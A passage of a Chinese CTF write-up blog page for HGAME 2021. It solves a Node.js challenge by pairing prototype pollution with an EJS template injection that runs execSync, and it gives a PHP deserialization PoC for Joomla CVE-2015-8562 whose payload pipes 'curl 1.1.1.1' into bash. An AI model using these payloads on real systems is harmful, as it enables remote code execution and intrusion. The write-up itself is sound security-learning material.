req.body[key]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        req.session.crying = data.crying</span><br><span class="line">        req.session.name = data.name</span><br><span class="line">        req.session.discription = data.discription</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res.redirect(<span class="number">302</span>, <span class="string">&#x27;/show&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res.render(<span class="string">&#x27;loop&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.all(<span class="string">&#x27;/show&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.session.name || !req.session.discription) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.redirect(<span class="number">302</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> wishes = req.session.wishes ? req.session.wishes : <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res.render(<span class="string">&#x27;show&#x27;</span>, &#123;</span><br><span class="line">        name: req.session.name,</span><br><span class="line">        discription: req.session.discription,</span><br><span class="line">        wishes: wishes</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.all(<span class="string">&#x27;/wish&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.session.crying) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.send(<span class="string">&quot;forbidden.&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (req.method == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> wishes = req.body.wishes</span><br><span class="line">        req.session.wishes = ejs.render(<span class="string">`&lt;div class=&quot;wishes&quot;&gt;<span class="subst">$&#123;wishes&#125;</span>&lt;/div&gt;`</span>)</span><br><span class="line">        <span class="keyword">return</span> res.redirect(<span class="number">302</span>, <span class="string">&#x27;/show&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res.render(<span class="string">&#x27;wish&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>, <span class="function">() =&gt;</span> <span class="built_in">console</span>.log(<span class="string">`App start on port 3000!`</span>))</span><br></pre></td></tr></table></figure>
+
+<p>原型链污染出现在</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span>.keys(req.body).forEach(<span class="function">(<span class="params">key</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (key !== <span class="string">&quot;crying&quot;</span>) &#123;</span><br><span class="line">        data[key] = req.body[key]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>构造</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: macguffin.0727.site:5000</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="attribute">Cookie</span>: session=s%3AwAcqo_ZTsY89vKXsAyZaHShlpscCKww6.WB2AVS3298UqJDeylhn9Ek8SghOW%2BjZ9tcRb2gUJObg</span><br><span class="line"><span class="attribute">Content-Length</span>: 74</span><br><span class="line"></span><br><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;crying&quot;:&quot;crying&quot;&#125;,&quot;name&quot;:&quot;MoonBack&quot;,&quot;discription&quot;:&quot;hack&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接着替换新的cookie给/wish 并POST过去wishes值为 进行模板注入</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- <span class="built_in">global</span>.process.mainModule.require(<span class="string">&#x27;child_process&#x27;</span>).execSync(<span class="string">&#x27;cat /flag&#x27;</span>) %&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在用相同的cookie访问/show就有flag了</p>
+<h4 id="joomlaJoomla"><a href="#joomlaJoomla" class="headerlink" title="joomlaJoomla!!!!!"></a>joomlaJoomla!!!!!</h4><p>有源码 根据时间搜下 看看哪些文件最近改动了 只有两个文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find ./ -<span class="built_in">type</span> f -mtime -5 | grep php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/01/30/HGAME2021%E9%83%A8%E5%88%86writeup/image-20210224231556985.png" alt="image-20210224231556985"></p>
+<p>版本信息位于</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;administrator&#x2F;manifests&#x2F;files&#x2F;joomla.xml</span><br></pre></td></tr></table></figure>
+
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html">https://www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/joomla/CVE-2015-8562">https://github.com/vulhub/vulhub/tree/master/joomla/CVE-2015-8562</a></p>
+<p>poc:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JSimplepieFactory</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JDatabaseDriverMysql</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SimplePie</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $sanitize;</span><br><span class="line">    <span class="keyword">var</span> $cache;</span><br><span class="line">    <span class="keyword">var</span> $cache_name_function;</span><br><span class="line">    <span class="keyword">var</span> $javascript;</span><br><span class="line">    <span class="keyword">var</span> $feed_url;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;feed_url = <span class="string">&quot;system(&#x27;curl 1.1.1.1 | bash&#x27;);JFactory::getConfig();exit;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;javascript = <span class="number">9999</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cache_name_function = <span class="string">&quot;assert&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sanitize = <span class="keyword">new</span> JDatabaseDriverMysql();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cache = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JDatabaseDriverMysqli</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $a;</span><br><span class="line">    <span class="keyword">protected</span> $disconnectHandlers;</span><br><span class="line">    <span class="keyword">protected</span> $connection;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="keyword">new</span> JSimplepieFactory();</span><br><span class="line">        $x = <span class="keyword">new</span> SimplePie();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;connection = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;disconnectHandlers = [</span><br><span class="line">            [$x, <span class="string">&quot;init&quot;</span>],</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> JDatabaseDriverMysqli();</span><br><span class="line">$poc = serialize($a); </span><br><span class="line"></span><br><span class="line">$poc = str_replace(<span class="string">&quot;\x00*\x00&quot;</span>, <span class="string">&#x27;\\0\\0\\0&#x27;</span>, $poc);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;123&#125;__test||<span class="subst">&#123;$poc&#125;</span>\xF0\xFD\xFD\xFD&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>推荐在线运行：<a target="_blank" rel="noopener" href="https://sandbox.onlinephpfunctions.com/">https://sandbox.onlinephpfunctions.com/</a></p>
+
+          
+            <div class='article_footer'>
+              
+                
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+<section class="widget copyright  desktop mobile">
+  <div class='content'>
+    
+      <blockquote>
+        
+          
+            <p>本文永久链接是：<a href=http://www.moonback.xyz/2021/01/30/HGAME2021%E9%83%A8%E5%88%86writeup/>http://www.moonback.xyz/2021/01/30/HGAME2021%E9%83%A8%E5%88%86writeup/</a></p>
+          
+        
+      </blockquote>
+    
+  </div>
+</section>
+
+  
+
+  
+
+
+              
+            </div>
+          
+        </div>
+        
+          
+
+
+  <section class='meta' id="footer-meta">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-03-02T14:06:14+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：2021年3月2日</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/writeup/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>writeup</p></a></div>
+
+
+        
+      
+        
+          
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.moonback.xyz/2021/01/30/HGAME2021%E9%83%A8%E5%88%86writeup/&title=HGAME2020部分writeup - 明月归的小站&summary=lai来了来了"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qq.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://www.moonback.xyz/2021/01/30/HGAME2021%E9%83%A8%E5%88%86writeup/&title=HGAME2020部分writeup - 明月归的小站&summary=lai来了来了"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qzone.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.moonback.xyz/2021/01/30/HGAME2021%E9%83%A8%E5%88%86writeup/&title=HGAME2020部分writeup - 明月归的小站&summary=lai来了来了"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/weibo.png">
+          
+        </a>
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+  </section>
+
+
+        
+        
+          <div class="prev-next">
+            
+              <a class='prev' href='/2021/02/13/%E6%9F%90%E5%85%A5%E7%BE%A4%E9%A2%98writeup/'>
+                <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>某CTF入群题writeup</p>
+                <p class='content'>2021/2/13
+
+
+easygame源码：
+1234567891011121314151617181920212223&lt;?phphighlight_file(__FILE__);###...</p>
+              </a>
+            
+            
+              <a class='next' href='/2020/12/14/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/'>
+                <p class='title'>从VlunStack靶机二学习域渗透<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+                <p class='content'>闲来无事，跟着大佬思路做下！！！
+
+
+环境说明靶机链接：http://vulnstack.qiyuanxuetang.net/vuln/detail/3/
+内网网段：10.10.10.1/24
+...</p>
+              </a>
+            
+          </div>
+        
+      </section>
+    </article>
+  
+
+  
+    
+
+  <article class="post white-box reveal comments shadow">
+    <section class="article typo">
+      <p ct><i class='fas fa-comments'></i> 评论</p>
+      
+      <section id="comments">
+        <div id="valine_container" class="valine_thread">
+  <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
+</div>
+
+      </section>
+    </section>
+  </article>
+
+
+  
+
+
+
+
+<!-- 根据页面mathjax变量决定是否加载MathJax数学公式js -->
+
+
+</div>
+<aside class='l_side'>
+  
+  
+
+  
+    
+    
+
+
+
+  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
+    
+  <header>
+    
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#week1"><span class="toc-text">week1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web"><span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Hitchhiking-in-the-Galaxy"><span class="toc-text">Hitchhiking_in_the_Galaxy</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#watermelon"><span class="toc-text">watermelon</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9D%E8%97%8F%E8%B5%B0%E7%A7%81%E8%80%85"><span class="toc-text">宝藏走私者</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%99%BA%E5%95%86%E6%A3%80%E6%B5%8B%E9%B8%A1"><span class="toc-text">智商检测鸡</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B5%B0%E7%A7%81%E8%80%85%E7%9A%84%E6%84%A4%E6%80%92"><span class="toc-text">走私者的愤怒</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#misc"><span class="toc-text">misc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Base%E5%85%A8%E5%AE%B6%E7%A6%8F"><span class="toc-text">Base全家福</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8D%E8%B5%B7%E7%9C%BC%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%85%BB%E6%88%90%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-text">不起眼压缩包的养成的方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Galaxy"><span class="toc-text">Galaxy</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Word-RE-MASTER"><span class="toc-text">Word RE:MASTER</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crypto"><span class="toc-text">crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E3%81%BE%E3%81%B2%E3%81%A8"><span class="toc-text">まひと</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%B9%E7%A7%B0%E4%B9%8B%E7%BE%8E"><span class="toc-text">对称之美</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Transformer"><span class="toc-text">Transformer</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#re"><span class="toc-text">re</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#pypy"><span class="toc-text">pypy</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week2"><span class="toc-text">week2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web-1"><span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#LazyDogR4U"><span class="toc-text">LazyDogR4U</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Liki%E7%9A%84%E7%94%9F%E6%97%A5%E7%A4%BC%E7%89%A9"><span class="toc-text">Liki的生日礼物</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Post-to-zuckonit"><span class="toc-text">Post to zuckonit</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#200OK"><span class="toc-text">200OK!!</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#misc-1"><span class="toc-text">misc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Tools"><span class="toc-text">Tools</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Hallucigenia"><span class="toc-text">Hallucigenia</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DNS"><span class="toc-text">DNS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Telegraph%EF%BC%9A1601-6639-3459-3134-0892"><span class="toc-text">Telegraph：1601 6639 3459 3134 0892</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crypto-1"><span class="toc-text">crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#WhitegiveRSA"><span class="toc-text">WhitegiveRSA</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#gcd-or-more"><span class="toc-text">gcd or more?</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#signin"><span class="toc-text">signin</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week3"><span class="toc-text">week3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web-2"><span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Forgetful"><span class="toc-text">Forgetful</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Liki-Jail"><span class="toc-text">Liki-Jail</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Post-to-zuckonit2-0"><span class="toc-text">Post to zuckonit2.0</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Post-to-zuckonit-another-version"><span class="toc-text">Post to zuckonit another version</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Arknights"><span class="toc-text">Arknights</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#misc-2"><span class="toc-text">misc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#A-R-K"><span class="toc-text">A R K</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week4"><span class="toc-text">week4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web-3"><span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%AB%E6%97%A0%E6%AD%A2%E5%A2%83%E7%9A%84%E6%98%9F%E6%9C%9F%E6%97%A5"><span class="toc-text">漫无止境的星期日</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#joomlaJoomla"><span class="toc-text">joomlaJoomla!!!!!</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </section>
+
+
+  
+
+
+</aside>
+
+
+
+    </div>
+    
+  
+  <footer class="clearfix">
+    <br><br>
+    
+      
+        <br>
+        <div class="social-wrapper">
+          
+            
+              <a href="/atom.xml"
+                class="social fas fa-rss flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="mailto:3300162791@qq.com"
+                class="social fas fa-envelope flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="https://github.com/BeyondOneself"
+                class="social fab fa-github flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+          
+        </div>
+      
+    
+      
+        <div><p>博客内容遵循 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</a></p>
+</div>
+      
+    
+      
+        本站使用
+        <a href="https://github.com/volantis-x/hexo-theme-volantis/releases/tag/3.0.0" target="_blank" class="codename">Volantis</a>
+        作为主题，总访问量为
+          <span id="busuanzi_value_site_pv"><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+          次
+        
+      
+    
+      
+        <div class='copyright'>
+        <p><a href="/">Copyright © 2019-2020</a></p>
+
+        </div>
+      
+    
+  </footer>
+
+
+    <a class="s-top fas fa-arrow-up fa-fw" href='javascript:void(0)'></a>
+  </div>
+  <div>
+    
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5/dist/jquery.min.js"></script>
+
+
+
+  <script>
+    
+    var SEARCH_SERVICE = "hexo" || "hexo";
+    var ROOT = "/" || "/";
+    if (!ROOT.endsWith('/')) ROOT += '/';
+  </script>
+
+
+
+  <script async src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@2/js/instant_page.js" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+
+
+
+  
+  
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery-backstretch@2.1.18/jquery.backstretch.min.js"></script>
+
+    <script type="text/javascript">
+      $(function(){
+        var imgs=["https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/001.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/002.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/003.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/004.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/005.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/006.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/012.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/016.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/019.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/033.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/034.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/035.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/038.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/039.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/042.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/046.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/051.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/052.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/054.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/056.jpg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg"];
+        if ('true' == 'true') {
+          function shuffle(arr){
+            /*From countercurrent-time*/
+            var n = arr.length;
+            while(n--) {
+              var index = Math.floor(Math.random() * n);
+              var temp = arr[index];
+              arr[index] = arr[n];
+              arr[n] = temp;
+            }
+          }
+          shuffle(imgs);
+        }
+        if ('.cover') {
+          $('.cover').backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        } else {
+          $.backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        }
+      });
+    </script>
+  
+
+
+
+
+
+
+  
+  
+<script src="/js/valine.js"></script>
+
+
+<script>
+  var GUEST_INFO = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link'.split(',').filter(function (item) {
+    return GUEST_INFO.indexOf(item) > -1
+  });
+  var REQUIRED_FIELDS = ['nick', 'mail', 'link'];
+  var requiredFields = 'nick,mail'.split(',').filter(function (item) {
+    return REQUIRED_FIELDS.indexOf(item) > -1
+  });
+
+  function emoji(path, idx, ext) {
+    return path + "/" + path + "-" + idx + "." + ext;
+  }
+
+  var emojiMaps = {};
+  for (var i = 1; i <= 54; i++) {
+    emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+  }
+  for (var i = 1; i <= 101; i++) {
+    emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+  }
+  for (var i = 1; i <= 116; i++) {
+    emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+  }
+  for (var i = 1; i <= 125; i++) {
+    emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+  }
+  for (var i = 1; i <= 4; i++) {
+    emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+  }
+
+  function pjax_valine() {
+    let pageUrl = $.trim($('#pjax-comment-path').text()) === "none" ? 
+      decodeURI(window.location.pathname) : $.trim($('#pjax-comment-path').text());
+    let pagePlaceholder = $.trim($('#pjax-comment-placeholder').text()) === "none" ?
+      "快来评论吧~" : $.trim($('#pjax-comment-placeholder').text());
+
+    let ALLPATH = '';
+    if(ALLPATH != '') pageUrl = ALLPATH;
+
+    var valine = new Valine();
+    valine.init({
+      el: '#valine_container',
+      meta: meta,
+      placeholder: pagePlaceholder,
+      path: pageUrl,
+      appId: "or2NepulP8NGKXehq1IRSQTc-gzGzoHsz",
+      appKey: "lRlc11XLlqK4AeDJeNJxo17y",
+      pageSize: '10',
+      avatar: 'robohash',
+      lang: 'zh-cn',
+      visitor: 'true',
+      highlight: 'true',
+      mathJax: 'false',
+      enableQQ: 'true',
+      requiredFields: requiredFields,
+      emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+      emojiMaps: emojiMaps
+    })
+  }
+
+  $(function () {
+    pjax_valine();
+  });
+</script>
+
+
+
+
+<!-- darkmodejs -->
+
+
+<!-- 复制 -->
+
+  <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+    var clipboard = new ClipboardJS('.btn-copy', {
+        target: function (trigger) {
+            return trigger.nextElementSibling
+        }
+    });
+    function wait(callback, seconds) {
+        var timelag = null;
+        timelag = window.setTimeout(callback, seconds)
+    }
+    function pjax_initCopyCode() {
+        var copyHtml = '';
+        copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+        copyHtml += '<i class="fas fa-copy"></i><span>COPY</span>';
+        copyHtml += '</button>';
+        $(".highlight .code pre").before(copyHtml);
+        $(".article pre code").before(copyHtml);
+        clipboard.off('success').on('success', function (e) {
+            let $btn = $(e.trigger);
+            $btn.addClass('copied');
+            let $icon = $($btn.find('i'));
+            $icon.removeClass('fa-copy');
+            $icon.addClass('fa-check-circle');
+            let $span = $($btn.find('span'));
+            $span[0].innerText = 'COPIED';
+            wait(function () {
+                $icon.removeClass('fa-check-circle');
+                $icon.addClass('fa-copy');
+                $span[0].innerText = 'COPY'
+            }, 2000)
+        });
+        clipboard.off('error').on('error', function (e) {
+            e.clearSelection();
+            let $btn = $(e.trigger);
+            $btn.addClass('copy-failed');
+            let $icon = $($btn.find('i'));
+            $icon.removeClass('fa-copy');
+            $icon.addClass('fa-times-circle');
+            let $span = $($btn.find('span'));
+            $span[0].innerText = 'COPY FAILED';
+            wait(function () {
+                $icon.removeClass('fa-times-circle');
+                $icon.addClass('fa-copy');
+                $span[0].innerText = 'COPY'
+            }, 2000)
+        })
+    }
+    $(function () {
+        pjax_initCopyCode()
+    });
+</script>
+
+
+<!-- scrollreveal -->
+
+  <script src="https://cdn.jsdelivr.net/npm/scrollreveal@4.0.6/dist/scrollreveal.min.js"></script>
+  <script type="text/javascript">
+    function pjax_scrollrebeal() {
+      ScrollReveal().reveal('.l_main .reveal', {
